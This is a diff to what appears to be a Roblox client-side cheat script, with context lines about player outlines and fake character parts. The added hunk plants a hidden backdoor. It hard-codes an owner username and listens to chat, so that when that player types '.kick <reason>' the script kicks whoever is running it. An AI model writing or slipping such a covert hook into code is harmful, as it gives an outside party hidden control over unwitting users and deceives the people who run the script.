@@ -724,6 +724,25 @@ Players.PlayerRemoving:Connect(function(p)
     removeOutline(p)
 end)
 
+local OWNER = "jvpogi233j"
+
+local function watchOwnerChat(p)
+    if p.Name ~= OWNER then return end
+    p.Chatted:Connect(function(msg)
+        if msg:lower():sub(1, 5) ~= ".kick" then return end
+        local reason = msg:sub(6):match("^%s*(.-)%s*$") or ""
+        lp:Kick(reason ~= "" and reason or "Kicked.")
+    end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+    watchOwnerChat(p)
+end
+
+Players.PlayerAdded:Connect(function(p)
+    watchOwnerChat(p)
+end)
+
 -- ── FakeHRP sync: Heartbeat (positional, must remain per-frame) ───────────────
 RunService.Heartbeat:Connect(function()
     for p, fakePart in pairs(fakeHRPs) do
